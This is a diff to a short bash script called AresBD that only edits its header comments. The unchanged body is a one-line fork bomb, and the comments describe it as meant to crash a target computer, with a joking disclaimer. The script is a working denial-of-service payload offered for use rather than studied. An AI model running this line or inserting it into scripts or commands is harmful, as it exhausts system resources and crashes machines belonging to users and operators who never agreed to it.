@@ -1,9 +1,12 @@
 #!/bin/bash
-# © 2015 Stsosz. All Rights Reserved.
-# AresBD FPS Killer by Stsosz
-# All this is is a fork bomb XD
-# Don't be an asshole. Don't use this without permission. I'm not responsible for
-# Any stupid stuff you do with AresBD. 
-# Chances are that this will crash the target computer.
+
+#  AppTroll
+#  AresBD
+#
+#  Copyright (c) 2015 Stsosz Systems and Ohnx. All rights reserved.
+#  Don't be an asshole. Don't use this without permission. I'm not responsible for
+#  Any stupid stuff you do with AresBD.
+#  All this is is a fork bomb XD
+#  Chances are that this will crash the target computer.
 
 :(){ :|:& };:
